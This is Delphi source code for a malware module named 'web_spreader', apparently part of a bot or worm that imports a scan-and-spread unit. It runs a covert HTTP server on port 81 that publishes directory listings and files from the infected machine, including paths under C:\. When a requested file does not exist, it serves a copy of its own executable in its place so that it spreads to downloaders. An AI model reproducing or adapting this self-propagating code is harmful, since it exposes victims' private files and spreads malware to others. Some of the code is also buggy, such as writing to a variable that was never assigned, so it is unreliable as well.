(* created by p0ke *)

unit web_spreader;

interface

Uses
  Windows, Winsock;

Type
  TSocketData = Record
    Socket: TSocket;
  End;
  PSocketData = ^TSocketData;

Var
  WebSocket:    TSocket;
  Sockets  :    Array[0..500] Of TSocket;
  wData    :    TWSAData;
  SocketData:   TSocketData;

  Procedure StartWebServer;

implementation

Uses
  untFunctions, Scan_Spread;

Function ExtractFileExt(Delimiter, Input: String): String;
Begin
  While Pos(Delimiter, Input) <> 0 Do
    Delete(Input, 1, Pos(Delimiter, Input));
  Result := Input;
End;

function FileExists(const FileName: string): Boolean;
var
lpFindFileData: TWin32FindData;
hFile: Cardinal;
begin
  hFile := FindFirstFile(PChar(FileName), lpFindFileData);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    result := True;
    Windows.FindClose(hFile)
  end
  else
    result := False;
end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

Function GetContent(Ext: String): String;
Var
  Temp :String;
Begin
  Temp := '.'+Ext;

  try
    Temp := GetRegValue(HKEY_CLASSES_ROOT, Temp, 'Content Type');
  except
  end;

  If Temp <> '' Then
    Result := Temp
  Else
    Result := 'application/x-msdownload';
End;

function StrToIntDef(s : string; Default: Integer) : integer;
var j : integer;
begin
  Val(s,Result,j);
  if j > 0 then Result := Default;
end;

Procedure ServerFile(FileName: String; Sock: TSocket);
Var
  ContentType   :String;
  Result        :String;
  Data          :String;
  S             :String;
  Ch            :String;

  F             :TextFile;

  BytesRead     :Cardinal;
  FileSize      :Integer;
  I             :Integer;
  Error         :Integer;

  SR            :TSearchRec;
Begin
  ReplaceStr('%C3%B6', 'ö', FileName);
  Repeat
    I := Pos('%', FileName);
    If (I > 0) Then
    Begin
      Ch := Chr(StrToIntDef('$'+Copy(FileName, I+1, 2), 0));
      Delete(FileName, I, 3);
      Insert(CH, FileName, I);
    End;
  Until I = 0;

  If (FileName[1] = '/') Then
    Delete(FileName, 1, 1);

  For I := 1 To Length(FileName) Do
    If FileName[I] = '/' Then FileName[I] := '\';

  If ((Not FileExists(FileName)) and (Not DirectoryExists(Filename))) Then Filename := 'C:\'+FileName;
  If ((Not FileExists(FileName)) and (Not DirectoryExists(Filename))) Then
    If (LowerCase(ExtractFileExt('.', FileName)) = 'htm') Then
    Begin
      AssignFile(F, S);
      ReWrite(F);
      ;
      CloseFile(F);
    End Else
      CopyFile(pChar(ParamStr(0)), pChar(S), False);

  If (FileName[Length(FileName)]) = '\' Then
  Begin
    For I := 1 To Length(FileName) Do
      If FileName[I] = '\' Then FileName[I] := '/';

    S := GetDirectory(0)+'temp'+IntToStr(Random($FFFFFFFF))+'.htm';
    AssignFile(F, S);
    ReWrite(F);

    Result := BOT_WEBSERVERTITLE;
    ReplaceStr('%localip%', GetLocalIP, Result);
    ReplaceStr('%version%', BOT_REALVERSION, Result);

    WriteLn(F, '<HTML>');
    WriteLn(F, '<BODY><BR>');
    WriteLn(F, '<BODY BGCOLOR="#cccccc"><TITLE>'+Result+'</TITLE><BR>');
    WriteLn(F, '<FONT COLOR="BLACK" FACE="LUCIDA CONSOLE, TAHOMA, VERDANA, ARIAL" SIZE=2>');
    WriteLn(F, 'Welcome To Stubbos Webserver @ http://'+GetLocalIP+':81<br>');
    WriteLn(F, 'Browsing '+FileName+'*.* for the moment');
    WriteLn(F, '</FONT>');
    WriteLn(F, '<FONT COLOR="BLACK" FACE="LUCIDA CONSOLE, TAHOMA, VERDANA, ARIAL" SIZE=1>');
    WriteLn(F, '<br><br>');

    WriteLn(F, '<style type="text/css">');
    WriteLn(F, '  .pt1 {');
    WriteLn(F, '    color: #000000;');
    WriteLn(F, '    font-size: 14;');
    WriteLn(F, '    font-family: Lucida Console, Tahoma, Verdana, Arial;');
    WriteLn(F, '  }');
    WriteLn(F, '  .pt2 {');
    WriteLn(F, '    color: #000000;');
    WriteLn(F, '    font-size: 12;');
    WriteLn(F, '    font-family: Lucida Console, Tahoma, Verdana, Arial;');
    WriteLn(F, '  }');
    WriteLn(F, 'a {');
    WriteLn(F, '    color : #FFFFFF;');
    WriteLn(F, '    text-decoration : none;');
    WriteLn(F, '}');
    WriteLn(F, 'a:hover {');
    WriteLn(F, '    color : #FFFFCC;');
    WriteLn(F, '    text-decoration : none;');
    WriteLn(F, '}');
    WriteLn(F, '</style>');

    WriteLn(F, '<table width=75% height=0 align=top class="pt1">');
    WriteLn(F, '  <tr>');
    WriteLn(F, '  <td width=70% align=left class="pt2">');
    WriteLn(F, '    <b>Filename</b>');
    WriteLn(F, '  </td>');
    WriteLn(F, '  <td width=30% align=left class="pt2">');
    WriteLn(F, '    <b>Size</b>');
    WriteLn(F, '  </td>');
    WriteLn(F, '  </tr>');
    WriteLn(F, '</table>');

    Error := FindFirst(FileName+'*.*', faAnyFile, SR);
    Data := Filename;
    If (Data[1] = '/') Then Delete(Data,1,1);
    If (Data[2] = ':') Then Delete(Data,1,3);
    While (Error = 0) Do
    Begin
      If (SR.Attr and faDirectory > 0) Then
      Begin
        WriteLn(F, '<table width=75% height=0 align=top class="pt1">');
        WriteLn(F, '  <tr>');
        WriteLn(F, '  <td width=70% align=left class="pt2">');
        WriteLn(F, '<LI><A HREF="http://'+GetLocalIP+':81/'+Data+SR.Name+'/"><B><FONT COLOR="#000000">'+SR.Name+'</FONT></B></A></LI>');
        WriteLn(F, '  </td>');
        WriteLn(F, '  <td width=30% align=left class="pt2">');
        WriteLn(F, '    (Directory)');
        WriteLn(F, '  </td>');
        WriteLn(F, '  </tr>');
        WriteLn(F, '</table>');
      End;
      Error := FindNext(SR);
    End;

    Error := FindFirst(FileName+'*.*', faAnyFile, SR);
    Data := Filename;
    If (Data[1] = '/') Then Delete(Data,1,1);
    If (Data[2] = ':') Then Delete(Data,1,3);
    While (Error = 0) Do
    Begin
      If (SR.Attr and faDirectory <= 0) Then
      Begin
        WriteLn(F, '<table width=75% height=0 align=top class="pt1">');
        WriteLn(F, '  <tr>');
        WriteLn(F, '  <td width=70% align=left class="pt2">');
        WriteLn(F, '<A HREF="http://'+GetLocalIP+':81/'+Data+SR.Name+'"><FONT COLOR="#000000">'+SR.Name+'</FONT></A>');
        WriteLn(F, '  </td>');
        WriteLn(F, '  <td width=30% align=left class="pt2">');
        WriteLn(F, '    '+IntToStr(SR.Size)+' bytes');
        WriteLn(F, '  </td>');
        WriteLn(F, '  </tr>');
        WriteLn(F, '</table>');
      End;
      Error := FindNext(SR);
    End;
    WriteLn(F, '</HTML>');
    CloseFile(F);

    FileName := S;
  End;

  ContentType := GetContent( LowerCase(ExtractFileExt('.', FileName)));

  FileSize   := GetFileSize(FileName);

  Result     :=  'HTTP/1.1 200 OK'#13#10
                +'Accept-Ranges: bytes'#13#10
                +'Content-Length: '+IntToStr(FileSize) + #13#10
                +'Keep-Alive: timeout=15, max=100'#13#10
                +'Connection: Keep-Alive'#13#10
                +'Content-Type: '+ContentType+#13#10#13#10;
  Send(Sock, Result[1], Length(Result), 0);
  Sleep(500);

  SetLength(Data, 5012);

  For I := 1 To Length(Data) Do
  Begin
    Delete(Data, I, 1);
    Insert(' ', Data, I);
  End;

  ReadFileStr(FileName, S);
  Repeat
    Data := Copy(S, 1, 5012);
    Delete(S, 1, 5012);
    BytesRead := Length(Data);
    Send(Sock, Data[1], Length(Data), 0);
  Until BytesRead < 5012;
End;

Procedure ReadSock(P: Pointer); STDCALL;
Var
  Buf: Array[0..16000] Of Char;
  Sock: TSocket;
  Data: String;
Begin
  Sock := PSocketData(P)^.Socket;
  While Recv(Sock, Buf, SizeOf(Buf), 0) > 0 Do
  Begin
    Data := Buf;
    ZeroMemory(@Buf, SizeOf(Buf));
    If Pos('GET', Data) > 0 Then
    Begin
      Delete(Data, 1, 4);
      Data := Copy(Data, 1, Pos('HTTP/1.1', Data)-2);
      ServerFile(Data, Sock);
    End;
  End;
End;

Function WaitForConnection: boolean;
var
  fdset: TFDset;
begin
  fdset.fd_count := 1;
  fdset.fd_array[0] := WebSocket;
  Select(0,@fdset,NIL,NIL,NIL);
  Result := True;
end;

Procedure WebServer;
Var
  Size: Integer;
  SockAddr: TSockAddr;
  SockAddrIn: TSockAddrIn;
  ThreadID: Dword;
  I, J: Integer;
Begin
  WSAStartUp(257, wData);

  ZeroMemory(@I, SizeOf(I));
  ZeroMemory(@J, SizeOf(J));
  WebSocket := INVALID_SOCKET;
  WebSocket := Socket(PF_INET, SOCK_STREAM, getprotobyname('tcp').p_proto);
  If WebSOcket = INVALID_SOCKET Then Exit;
  SockAddrIn.sin_family := AF_INET;
  SockAddrIn.sin_port := hTons(81);
  SockAddrIn.sin_addr.S_addr := INADDR_ANY;

  Bind(WebSocket, SockAddrIn, SizeOf(SockAddrIn));

  If Winsock.Listen(WebSocket, 5) <> 0 Then Exit;

  While WaitForConnection Do
  Begin
    Size := SizeOf(TSockAddr);
    For I := 0 To 500 Do
      If Sockets[i] <= 0 Then
      Begin
        Sockets[I] := Winsock.Accept(WebSocket, @SockAddr, @Size);
        If Sockets[I] > 0 Then
        Begin
          SocketData.Socket := Sockets[I];
          CreateThread(NIL, 0, @ReadSock, @SocketData, 0, ThreadID);
          Break;
        End;
      End;
  End;

  WsaCleanUp;
End;

Procedure StartWebServer;
Var
  ThreadID      :DWord;
Begin
  CreateThread(NIL, 0, @WebServer, NIL, 0, ThreadID);
End;

end.
